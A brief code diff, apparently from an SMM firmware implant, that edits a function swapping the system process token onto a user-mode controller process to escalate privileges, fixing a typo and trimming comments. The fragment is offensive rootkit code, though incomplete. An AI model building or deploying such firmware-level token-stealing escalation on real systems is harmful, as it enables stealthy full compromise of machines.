@@ -444,9 +444,6 @@ CmdVirtToPhys(
 /**
  * \brief Changes controller process token
  * 
- * \
- * \
- * 
  * \return EFI_SUCCESS - Operation was performed succesfully
  * \return EFI_INVALID_PARAMETER - One or more arguments are invalid
  * \return EFI_ABORTED - Unable to map system or controller EPROCESS into SMRAM
@@ -458,7 +455,7 @@ CmdEscalatePrivileges(
 ) {
 	SerialPrint("[ SMM ] Leveraging controller process\r\n");
 
-	return NtExchageProcessToken(gLiveSession.SysProcess.PhysPsInitialSysProcess, gLiveSession.UmController.PhysUmControllerEprocess);
+	return NtExchangeProcessToken(gLiveSession.SysProcess.PhysPsInitialSysProcess, gLiveSession.UmController.PhysUmControllerEprocess);
 }
 
 /**
